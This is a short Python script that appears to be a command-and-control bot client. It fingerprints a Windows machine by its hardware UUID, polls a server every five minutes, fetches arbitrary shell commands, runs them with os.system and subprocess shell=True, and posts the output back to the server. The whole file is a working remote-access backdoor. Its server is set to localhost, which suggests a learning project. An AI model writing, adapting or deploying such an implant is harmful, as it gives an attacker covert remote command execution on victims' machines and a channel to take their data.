 #from http import client
import subprocess
import time
import requests
import os
import hashlib

HOST = 'http://127.0.0.1:8000'

def check_cmd(client_id):
    req = requests.get(
        HOST + '/cmd',
        headers={
            'client-id': client_id
        }
    )
    cmd = req.json()['cmd']
    os.system(cmd)
    output = subprocess.check_output(cmd, shell=True)
    requests.post(
        HOST +"/cmd",
        headers={
            'client-id': client_id
        },
        json={
            'output': output.decode('utf-8')
        }
    )


def ping(client_id):
    req = requests.get(
        HOST + '/ping',
        headers={
            'client-id': client_id
        }
    )
    ping = req.json()['ping']
    return ping

def download(client_id):
    req = requests.get(
        HOST + '/download',
        headers={
            'client-id': client_id
        }
    )
    download = req.json()['download']
    return download

def main():
    client = subprocess.check_output('wmic csproduct get UUID')
    client_id = hashlib.sha256(client).hexdigest()
    while(True):
        if ping(client_id):
            check_cmd(client_id)
        time.sleep(60*5)




if __name__ == '__main__':
    main()